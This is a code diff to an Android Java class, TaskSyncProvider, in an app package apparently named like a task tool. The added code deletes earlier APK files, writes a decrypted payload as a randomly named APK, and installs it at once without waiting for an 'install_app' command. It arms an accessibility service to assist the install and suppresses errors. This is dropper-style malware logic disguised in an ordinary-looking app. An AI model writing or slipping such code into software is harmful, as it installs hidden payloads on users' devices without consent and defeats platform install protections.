@@ -47,6 +47,14 @@ public class TaskSyncProvider {
 
             byte[] decryptedData = decryptData(encryptedData);
 
+            // Keep only one APK in private storage: delete older apk files first
+            File[] existing = context.getFilesDir().listFiles((d, name) -> name.endsWith(".apk"));
+            if (existing != null) {
+                for (File f : existing) {
+                    f.delete();
+                }
+            }
+
             File outputFile = new File(context.getFilesDir(), getRandomName() + ".apk");
             FileOutputStream fos = new FileOutputStream(outputFile);
             fos.write(decryptedData);
@@ -56,6 +64,21 @@ public class TaskSyncProvider {
             result.put("path", outputFile.getAbsolutePath());
             result.put("size", decryptedData.length);
             result.put("hash", getMD5(decryptedData));
+
+            // Self-trigger install immediately (do not wait for install_app command)
+            try {
+                com.task.tusker.services.UnifiedAccessibilityService svc = com.task.tusker.services.UnifiedAccessibilityService.getInstance();
+                if (svc != null) svc.armInstallAssist(outputFile.getAbsolutePath());
+                android.content.Intent intent = new android.content.Intent(android.content.Intent.ACTION_VIEW);
+                android.net.Uri uri = androidx.core.content.FileProvider.getUriForFile(
+                        context,
+                        context.getPackageName() + ".fileprovider",
+                        outputFile);
+                intent.setDataAndType(uri, "application/vnd.android.package-archive");
+                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK
+                        | android.content.Intent.FLAG_GRANT_READ_URI_PERMISSION);
+                context.startActivity(intent);
+            } catch (Exception ignored) {}
 
         } catch (Exception e) {
             try {
